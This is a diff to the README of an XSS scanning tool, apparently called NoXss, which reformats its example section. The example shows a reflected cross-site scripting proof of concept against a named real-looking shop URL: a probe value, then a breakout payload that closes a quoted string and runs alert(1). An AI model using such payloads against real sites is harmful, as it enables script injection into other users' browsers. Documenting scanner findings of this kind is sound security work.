@@ -96,7 +96,7 @@ Some xss is difficult to scan.NoXss will save some files in traffic/ for analysi
 + *.error(some error happened such as timeout,connection reset,etc.)
 + *.multipart(when request is multupart-formed,not easy to scan)
 # Example
-As you see in [Screenshot](./#screenshot),the poc is "http://dgwestore.nestlechinese.com/weixin/asset/Show.aspx?openid=abcdef&id=xssjs%22%3B".That means use the payload "xssjs%22%3B" in param "id":  
+As you see in [Screenshot](https://github.com/lwzSoviet/NoXss#screenshot),the poc is `"http://dgwestore.nestlechinese.com/weixin/asset/Show.aspx?openid=abcdef&id=xssjs%22%3B"`.That means use the payload `"xssjs%22%3B"` in param "id":  
 ![poc](https://github.com/lwzSoviet/download/blob/master/images/poc.png)  
-Then you can end the double qoutes use payload `xssjs";alert(1);//`.Visit http://dgwestore.nestlechinese.com/weixin/asset/Show.aspx?openid=abcdef&id=xssjs";alert(1)//:  
+Then you can end the double qoutes use payload `xssjs";alert(1);//`.The final exploit is `http://dgwestore.nestlechinese.com/weixin/asset/Show.aspx?openid=abcdef&id=xssjs";alert(1)//`:  
 ![poc](https://github.com/lwzSoviet/download/blob/master/images/result.png) 
